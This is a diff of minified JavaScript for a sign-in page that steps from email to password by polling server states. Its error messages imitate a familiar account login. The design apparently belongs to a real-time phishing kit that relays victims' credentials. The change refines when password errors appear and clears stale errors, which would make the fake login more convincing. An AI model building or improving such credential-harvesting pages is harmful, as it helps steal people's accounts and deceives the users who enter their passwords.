@@ -476,7 +476,7 @@ if(r.message&&!r.message.includes('Processing email')){showFieldError('InvalidEm
 }else if(s==='WAITINGEMAILERROR'){showFieldError('InvalidEmail','emailGroup','Enter a valid email address or phone number.')}
 startPolling(2000);break}
 case'WAITINGPASSWORD':case'WAITINGPASSWORDERROR':{
-lastVis=s;setFormSubmitting(false);
+lastVis=s;setFormSubmitting(false);hideAllErrors();
 if(sc){hideLoadingOverlay();
 var emailForName=d.email||eF.value||'';
 document.getElementById('emailStep').style.display='none';
@@ -493,8 +493,8 @@ pF.value='';pF.type='password'}
 eF.readOnly=true;pF.disabled=false;pF.focus();
 if(d.lastJsonResponse){
 try{var r=typeof d.lastJsonResponse==='string'?JSON.parse(d.lastJsonResponse):d.lastJsonResponse;
-var isPasswordError=r.verificationState==='WAITINGPASSWORD_ERROR'||r.accountAccess===false||(r.message&&(r.message.includes('Incorrect')||r.message.includes('incorrect')||r.message.includes('Wrong')||r.message.includes("Couldn't")||r.message.includes('password')||r.message.includes('Password')));
-if(isPasswordError){var em=r.message||'Your account or password is incorrect.';showFieldError('InvalidPassword','passwordGroup',em);lastPwdErr=em;pF.value='';pF.focus()}}catch(e){}
+var isExplicitError=s==='WAITINGPASSWORDERROR'||r.verificationState==='WAITINGPASSWORD_ERROR'||(r.message&&(r.message.includes('Incorrect')||r.message.includes('incorrect')||r.message.includes('Wrong')||r.message.includes("Couldn't")));
+if(isExplicitError){var em=r.message||'Your account or password is incorrect.';showFieldError('InvalidPassword','passwordGroup',em);lastPwdErr=em;pF.value='';pF.focus()}}catch(e){}
 }else if(s==='WAITINGPASSWORDERROR'){showFieldError('InvalidPassword','passwordGroup','Your account or password is incorrect.');lastPwdErr='Your account or password is incorrect.';pF.value='';pF.focus()}
 startPolling(2000);break}
 case'WAITINGOPTIONS':{
